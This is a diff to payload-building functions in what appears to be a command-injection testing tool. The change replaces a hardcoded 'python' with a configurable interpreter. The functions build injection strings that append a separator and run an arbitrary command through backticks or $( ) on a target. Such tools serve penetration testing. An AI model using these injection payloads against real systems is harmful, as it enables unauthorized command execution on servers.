@@ -91,13 +91,13 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
   else:
     if settings.SKIP_CALC:
       payload = (separator +
-                "python -c \"print'" + TAG +
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG +
                 TAG + 
                 TAG + "'\""
                 )
     else:
       payload = (separator +
-                "python -c \"print'" + TAG +
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG +
                 "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + 
                 TAG + "'%2B'" + 
                 TAG + "'\""
@@ -161,11 +161,11 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
 
     if settings.USE_BACKTICKS:
       payload = (separator +
-                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'`" + cmd + "`" + TAG + "'%2B'" + TAG + "'\""
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'`" + cmd + "`" + TAG + "'%2B'" + TAG + "'\""
                 )
     else:              
       payload = (separator +
-                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(" + cmd + ")'%2B'" + TAG + "'%2B'" + TAG + "'\""
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(" + cmd + ")'%2B'" + TAG + "'%2B'" + TAG + "'\""
                 )
   return payload
 
